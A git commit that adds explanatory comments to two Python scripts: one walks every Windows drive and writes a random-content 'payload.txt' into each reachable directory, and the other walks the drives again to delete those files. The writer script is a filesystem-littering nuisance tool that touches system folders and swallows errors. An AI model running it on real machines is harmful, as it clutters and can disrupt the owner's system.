dae6877aacba08e4076b9e687e3467dfc1fdaabd
Ewan <ewancroft26@gmail.com>
2023-09-03 02:07:55 +0100

    added comments

--- dumper.py
+++ dumper.py
@@ -4,6 +4,7 @@ import platform
 import win32api
 import string
 
+# Check the operating system
 if platform.system() == "Windows":
     release = platform.release()
     if release != "":
@@ -21,28 +22,39 @@ elif platform.system() == "Darwin":
     print(f"macOS {release} not supported.")
     quit()
 
+# Define valid characters for the payload
 valid_chars = string.printable
+# Get a list of available drives on the Windows system
 get_drives = win32api.GetLogicalDriveStrings()
 list_of_drives = get_drives.split("\x00")
 drive_list = []
 
+# Filter out empty drive names and create a list of available drives
 for drive in list_of_drives:
-    if drive == "":
-        pass
-    else:
+    if drive != "":
         drive_list.append(drive)
 
+# Iterate through the list of drives
 for drive in drive_list:
-    payload = "".join(random.choices(valid_chars, k = random.randint(1, 1024)))
+    # Generate a random text payload with a random length (up to 1024 characters)
+    payload = "".join(random.choices(valid_chars, k=random.randint(1, 1024)))
+    # Determine the number of payloads to create (1 to 5)
     payload_amount = random.randint(1, 5)
+    
+    # Check if the drive is a directory
     if os.path.isdir(drive):
+        # Recursively walk through the directory and its subdirectories
         for src, dirs, files in os.walk(drive):
+            # Create a file path for the payload in the current directory
             file_path = os.path.join(src, f"payload.txt")
             try:
+                # Attempt to create the payload file and write the payload content
                 with open(file_path, "w", encoding="UTF-8") as file:
                     file.write(payload)
                 print(f"Success! {file_path} created")
-            except:
+            except Exception as e:
+                # Ignore errors and continue to the next file or directory
                 pass
     else:
+        # If the drive is not a directory, skip it
         pass
--- remover.py
+++ remover.py
@@ -2,6 +2,7 @@ import os
 import platform
 import win32api  # type: ignore
 
+# Check the operating system
 if platform.system() == "Windows":
     release = platform.release()
     if release != "":
@@ -19,28 +20,39 @@ elif platform.system() == "Darwin":
     print(f"macOS {release} not supported.")
     quit()
 
+# Get the directory of the current script
 src = os.path.dirname(os.path.realpath(__file__))
+# Get a list of available drives on the Windows system
 get_drives = win32api.GetLogicalDriveStrings()
 list_of_drives = get_drives.split("\x00")
 drive_list = []
 
+# Filter out empty drive names and create a list of available drives
 for drive in list_of_drives:
-    if drive == "":
-        pass
-    else:
+    if drive != "":
         drive_list.append(drive)
 
+# Iterate through the list of drives
 for drive in drive_list:
+    # Check if the drive is a directory
     if os.path.isdir(drive):
+        # Recursively walk through the directory and its subdirectories
         for src, dirs, files in os.walk(drive):
+            # Create a file path for the "payload.txt" file in the current directory
             file_path = os.path.join(src, f"payload.txt")
+            
+            # Check if the file exists
             if os.path.exists(file_path):
                 try:
+                    # Attempt to delete the "payload.txt" file
                     win32api.DeleteFile(file_path)
                     print(f"Success! {file_path} deleted")
                 except win32api.error as e:
+                    # Ignore errors and continue to the next file or directory
                     pass
-            elif not os.path.exists(file_path):
-                print(f"no file in {src}")
+            else:
+                # If the file doesn't exist in the current directory, print a message
+                print(f"No file found in {src}")
     else:
+        # If the drive is not a directory, skip it
         pass
